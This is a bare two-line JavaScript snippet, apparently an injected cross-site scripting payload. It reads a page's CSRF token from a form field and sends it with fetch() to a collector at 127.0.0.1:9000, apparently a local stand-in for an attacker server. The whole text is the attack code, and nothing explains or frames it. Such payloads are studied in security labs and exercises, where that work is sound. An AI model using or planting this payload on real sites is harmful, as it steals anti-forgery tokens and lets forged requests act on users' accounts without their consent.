var token = document.querySelector('input[name="csrf_token"]').value;
fetch("http://127.0.0.1:9000/server.php?token=" + token);
